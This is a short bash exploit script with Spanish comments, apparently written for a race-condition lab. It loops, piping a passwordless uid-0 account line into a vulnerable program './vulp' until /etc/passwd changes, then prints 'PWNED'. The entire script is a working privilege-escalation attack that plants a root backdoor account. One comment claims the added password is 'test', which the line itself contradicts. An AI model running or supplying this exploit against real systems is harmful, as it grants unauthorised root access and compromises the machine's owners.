#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

# Verifica si el archivo ha sido modificado
while [ "$old" == "$new" ]
  do
    # Agrega un usuario "pwned" al archivo /etc/passwd con contraseña "test"
    # shellcheck disable=SC2016
    echo 'pwned::0:0:pwned:/root:/bin/bash' | ./vulp
    new=$($CHECK_FILE)
done
echo "PWNED :). El archivo /etc/passwd tiene que haber sido modificado."